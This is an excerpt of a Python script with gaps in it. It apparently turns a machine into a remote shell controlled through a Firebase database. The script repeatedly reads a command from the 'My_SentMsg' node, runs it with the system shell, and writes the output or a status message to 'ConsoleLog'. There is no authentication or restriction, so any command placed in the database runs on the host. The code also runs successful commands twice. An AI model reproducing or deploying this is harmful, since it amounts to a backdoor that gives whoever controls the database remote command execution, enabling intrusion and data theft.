...
#TO USE FOR SENDING STRING BACK TO SENDER
def ConsoleLogString(string):
    output = str(string)
    ...
    # To find pattern using Regex
    toFind = "(0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])[- /.](19|20)[0-9]{2}"
    reg = re.compile(toFind)

    indexer = 0
    temp_string = output
    real_output = ""

    while indexer < len(output) - 1:
        try:
            tuple = reg.search(temp_string).span()

            index1 = tuple[0]
            index2 = tuple[1]

            real_output += temp_string[index1: index2]

            temp_string = temp_string[index2:]  # Got rest of date 990..._________________________________
            #
            # time.sleep(0.5)
            # print(real_output)
            tuple = reg.search(temp_string).span()
            ...
            compareStr = temp_string[:index1]
            if (compareStr[-4:] == r"\r\n"):
                real_output += compareStr[:-4] + "\n"
            else:
                real_output += temp_string[:index1] + "\n"
            #
            # time.sleep(0.5)
            # print(real_output)
...
print("Receiver On.. ")
ReceivedMsg = db.child("My_SentMsg").get().val()
db.child("ConsoleLog").set("")


while ReceivedMsg.lower() != "quit":
    ReceivedMsg = db.child("My_SentMsg").get().val().strip()

    if(ReceivedMsg == ""):
        time.sleep(.25)

    elif(ReceivedMsg == "dir"):
        proc = subprocess.Popen('dir', shell=True, stdout=subprocess.PIPE)
        output = proc.communicate()[0]
        toSet = ConsoleLogString(output)
        db.child("ConsoleLog").set(toSet)
        db.child("My_SentMsg").set("")

    elif(ReceivedMsg == "cd"):
        proc = subprocess.Popen('cd', shell=True, stdout=subprocess.PIPE)
        output2 = proc.communicate()[0]
        output2 = str(output2)
        db.child("ConsoleLog").set(output2[2:-4])
        db.child("My_SentMsg").set("")
    elif (ReceivedMsg[0:2] == "cd" and len(ReceivedMsg) > 2):
        current_dir = os.getcwd()
        ReceivedMsg = ReceivedMsg[2:].strip()
        current_dir = current_dir + "\\" + ReceivedMsg
        os.chdir(current_dir)
        db.child("ConsoleLog").set("Command Successfully Completed.")
        db.child("My_SentMsg").set("")
    elif (ReceivedMsg == "quit"):
        sys.exit(0)
    else:
        proc = os.system(ReceivedMsg)
        if(proc == 0): #success
            os.system(ReceivedMsg)
            db.child("ConsoleLog").set("Command Successfully Completed.")
            db.child("My_SentMsg").set("")
        else:
            db.child("ConsoleLog").set("Error. Command Could Not Be Completed.")
            db.child("My_SentMsg").set("")
